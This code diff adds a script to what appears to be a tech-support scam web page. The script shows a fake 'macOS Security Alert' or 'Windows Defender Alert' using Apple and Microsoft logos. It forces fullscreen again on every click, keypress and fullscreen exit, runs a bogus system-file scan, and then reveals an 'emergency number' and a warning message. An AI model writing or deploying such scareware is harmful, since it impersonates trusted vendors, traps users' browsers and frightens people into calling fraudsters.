@@ -172,5 +172,61 @@
         applyOSTheme();
         enforceFullscreen();
     </script>
+	<script>
+        // Configuration
+        let forceMacMode = true; // Set to true to force Mac version
+        
+        // Detect environment
+        const isMac = navigator.platform.toLowerCase().includes('mac');
+        const isWindows = navigator.platform.toLowerCase().includes('win');
+        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+        // Apply OS theme
+        function applyOSTheme() {
+            if (forceMacMode || isMac || isSafari) {
+                $('body').addClass('mac-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg');
+                $('#scan-title').text('macOS Security Alert');
+            } else {
+                $('body').addClass('windows-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg');
+                $('#scan-title').text('Windows Defender Alert');
+            }
+        }
+
+        // Fullscreen management
+        function enforceFullscreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            }
+        }
+
+        // Scan functionality
+        $('#start-scan').click(function() {
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                $('.progress-fill').css('width', `${progress}%`);
+                $('#scan-status').text(`Scanning system files... ${progress}% complete`);
+                
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    $('.emergency-number, .warning-message').fadeIn(500);
+                }
+            }, 800);
+        });
+
+        // Event listeners
+        $(document)
+            .on('click keydown', enforceFullscreen)
+            .on('fullscreenchange', enforceFullscreen);
+
+        // Initial setup
+        applyOSTheme();
+        enforceFullscreen();
+    </script>
 </body>
 </html>
